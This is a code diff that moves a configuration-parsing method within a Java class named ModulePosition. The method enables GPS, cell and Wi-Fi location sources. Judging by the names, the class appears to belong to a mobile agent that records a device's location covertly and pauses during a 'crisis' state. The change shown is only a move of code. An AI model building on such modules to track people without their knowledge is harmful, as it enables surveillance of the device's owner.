@@ -67,6 +67,40 @@ public class ModulePosition extends BaseInstantModule implements IncrementalLog,
 	private boolean scanning;
 
 	@Override
+	public boolean parse(ConfModule conf) {
+	
+		try {
+			gpsEnabled = conf.getBoolean("gps");
+			cellEnabled = conf.getBoolean("cell");
+			wifiEnabled = conf.getBoolean("wifi");
+		} catch (ConfigurationException e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+	
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (parse) Error: " + e);
+			}
+			return false;
+		}
+	
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " Info: " + "gpsEnabled: " + gpsEnabled);//$NON-NLS-1$ //$NON-NLS-2$
+		}
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " Info: " + "cellEnabled: " + cellEnabled);//$NON-NLS-1$ //$NON-NLS-2$
+		}
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " Info: " + "wifiEnabled: " + wifiEnabled);//$NON-NLS-1$ //$NON-NLS-2$
+		}
+	
+		setPeriod(NEVER);
+		setDelay(POSITION_DELAY);
+	
+		return true;
+	}
+
+	@Override
 	public void actualStart() {
 		if (Status.self().crisisPosition()) {
 			if (Cfg.DEBUG) {
@@ -119,40 +153,6 @@ public class ModulePosition extends BaseInstantModule implements IncrementalLog,
 		}
 
 		return logCell;
-	}
-
-	@Override
-	public boolean parse(ConfModule conf) {
-
-		try {
-			gpsEnabled = conf.getBoolean("gps");
-			cellEnabled = conf.getBoolean("cell");
-			wifiEnabled = conf.getBoolean("wifi");
-		} catch (ConfigurationException e) {
-			if (Cfg.EXCEPTION) {
-				Check.log(e);
-			}
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (parse) Error: " + e);
-			}
-			return false;
-		}
-
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " Info: " + "gpsEnabled: " + gpsEnabled);//$NON-NLS-1$ //$NON-NLS-2$
-		}
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " Info: " + "cellEnabled: " + cellEnabled);//$NON-NLS-1$ //$NON-NLS-2$
-		}
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " Info: " + "wifiEnabled: " + wifiEnabled);//$NON-NLS-1$ //$NON-NLS-2$
-		}
-
-		setPeriod(NEVER);
-		setDelay(POSITION_DELAY);
-
-		return true;
 	}
 
 	private void locationWIFI() {
